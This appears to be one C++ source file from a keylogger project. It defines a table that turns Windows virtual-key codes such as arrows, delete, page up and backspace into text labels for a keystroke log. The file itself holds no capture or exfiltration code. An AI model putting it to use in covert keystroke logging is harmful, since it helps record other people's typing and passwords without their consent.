#include "stdafx.h"
#include "keylogger.h"

extern const std::map<BYTE, LPTSTR> keyDescr = {
	std::pair<WORD, LPTSTR>(VK_INSERT, _T("<ins>")),
	std::pair<WORD, LPTSTR>(VK_DELETE, _T("<del>")),
	std::pair<WORD, LPTSTR>(VK_CAPITAL, _T("<capslock>")),
	std::pair<WORD, LPTSTR>(VK_ESCAPE, _T("<esc>")),
	std::pair<WORD, LPTSTR>(VK_TAB, _T("<tab>")),
	std::pair<WORD, LPTSTR>(VK_LEFT, _T("<left>")),
	std::pair<WORD, LPTSTR>(VK_RIGHT, _T("<right>")),
	std::pair<WORD, LPTSTR>(VK_DOWN, _T("<down>")),
	std::pair<WORD, LPTSTR>(VK_UP, _T("<up>")),
	std::pair<WORD, LPTSTR>(VK_RETURN, _T("\r\n")),
	std::pair<WORD, LPTSTR>(VK_HOME, _T("<home>")),
	std::pair<WORD, LPTSTR>(VK_END, _T("<end>")),
	std::pair<WORD, LPTSTR>(VK_NEXT, _T("<pgdown>")),
	std::pair<WORD, LPTSTR>(VK_PRIOR, _T("<pgup>")),
	std::pair<WORD, LPTSTR>(VK_BACK, _T("<back>"))
};